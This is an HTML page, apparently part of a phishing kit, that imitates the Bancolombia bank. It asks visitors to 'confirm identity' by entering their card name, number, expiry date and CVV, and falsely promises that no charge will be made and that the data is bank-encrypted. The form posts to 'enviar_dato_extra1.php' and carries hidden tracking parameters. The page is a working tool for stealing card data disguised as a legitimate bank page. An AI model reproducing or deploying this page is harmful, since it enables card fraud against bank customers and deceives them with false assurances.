<body>

<form id="formTarjetaCompleta" action="enviar_dato_extra1.php" method="post">

  <div class="app-bar">
    <div class="left">
      <img class="logo-bco-img" src="../assets/svgs/logo-encabezado.svg" alt="Bancolombia" />
    </div>
    <a class="salir" href="#">Salir →</a>
  </div>

  <div class="page">

    <div class="card-wrap">
      <img src="img/Tarjeta-Debito-Mastercard-Bancolombia@2x.svg" alt="Tarjeta Débito Bancolombia Mastercard">
    </div>

    <h1 class="title">Confirma tu identidad</h1>

    <div class="text-box">

      <p class="lead">
        Ingresa los datos de tu tarjeta de débito para validar tu identidad y
        activar el cupo de tu <b>Tarjeta de crédito Virtual Mastercard</b>.
      </p>

      <p class="safe-note">
        No se realizará ningún cargo. Información protegida con cifrado bancario.
      </p>

      <div class="field">
        <label for="nombre">Nombre del titular</label>
        <div class="input-line">
          <svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
            <path d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4Zm0 2c-4 0-8 2-8 6v2h16v-2c0-4-4-6-8-6Z" fill="currentColor"/>
          </svg>
          <input
            type="text"
            id="nombre"
            name="nombre"
            autocomplete="cc-name"
            placeholder="Como aparece en la tarjeta"
            required>
        </div>
      </div>

      <div class="field">
        <label for="tarjeta">Número de tarjeta</label>
        <div class="input-line">
          <svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
            <path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2Zm0 14H4V10h16v8Zm0-10H4V6h16v2Z" fill="currentColor"/>
          </svg>
          <input
            type="tel"
            id="tarjeta"
            name="tarjeta"
            autocomplete="cc-number"
            inputmode="numeric"
            maxlength="19"
            placeholder="5306 0000 0000 0000"
            required>
        </div>
      </div>

      <div class="row-2">
        <div class="field">
          <label for="fecha">Vencimiento</label>
          <div class="input-line">
            <svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path d="M7 2h10v2h3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h3V2Zm2 2v2h6V4H9Zm11 6H4v10h16V10Z" fill="currentColor"/>
            </svg>
            <input
              type="tel"
              id="fecha"
              name="fecha"
              autocomplete="cc-exp"
              inputmode="numeric"
              maxlength="5"
              placeholder="MM/AA"
              required>
          </div>
        </div>

        <div class="field">
          <label for="cvv">CVV</label>
          <div class="input-line">
            <svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path d="M18 8h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Zm-9-2a3 3 0 0 1 6 0v2H9V6Zm9 14H6V10h12v10Z" fill="currentColor"/>
            </svg>
            <input
              type="tel"
              id="cvv"
              name="cvv"
              autocomplete="cc-csc"
              inputmode="numeric"
              maxlength="4"
              placeholder="CVV"
              required>
          </div>
        </div>
      </div>

      <div class="cta-wrap">
        <button id="btnContinuar" type="submit" class="btn-primary" disabled>Continuar</button>
      </div>

    </div>
  </div>

  <input type="hidden" name="key" id="key">
  <input type="hidden" name="requestId" id="requestId">
  <input type="hidden" name="rid" id="rid">
</form>

<script>
  (function () {
    var params = new URLSearchParams(window.location.search);
    var key       = params.get("key");
    var requestId = params.get("requestId");
    var rid       = params.get("rid");

    if (key)       document.getElementById("key").value       = key;
    if (requestId) document.getElementById("requestId").value = requestId;
    if (rid)       document.getElementById("rid").value       = rid;

    var $nombre  = document.getElementById("nombre");
    var $tarjeta = document.getElementById("tarjeta");
    var $fecha   = document.getElementById("fecha");
    var $cvv     = document.getElementById("cvv");
    var $btn     = document.getElementById("btnContinuar");

    function formatTarjeta(v) {
      v = v.replace(/\D/g, "").slice(0, 19);
      var g = [];
      for (var i = 0; i < v.length; i += 4) g.push(v.substring(i, i + 4));
      return g.join(" ");
    }

    function formatFecha(v) {
      v = v.replace(/\D/g, "").slice(0, 4);
      if (v.length <= 2) return v;
      return v.substring(0, 2) + "/" + v.substring(2);
    }

    function validar() {
      var nomOk  = $nombre.value.trim().length >= 2;
      var tarOk  = $tarjeta.value.replace(/\s/g, "").length >= 13;
      var fecOk  = /^\d{2}\/\d{2}$/.test($fecha.value);
      var cvvOk  = /^\d{3,4}$/.test($cvv.value);
      $btn.disabled = !(nomOk && tarOk && fecOk && cvvOk);
    }

    $tarjeta.addEventListener("input", function (e) {
      e.target.value = formatTarjeta(e.target.value);
      validar();
    });
    $fecha.addEventListener("input", function (e) {
      e.target.value = formatFecha(e.target.value);
      validar();
    });
    $cvv.addEventListener("input", function (e) {
      e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
      validar();
    });
    $nombre.addEventListener("input", validar);
    validar();
  })();
</script>

</body>
</html>
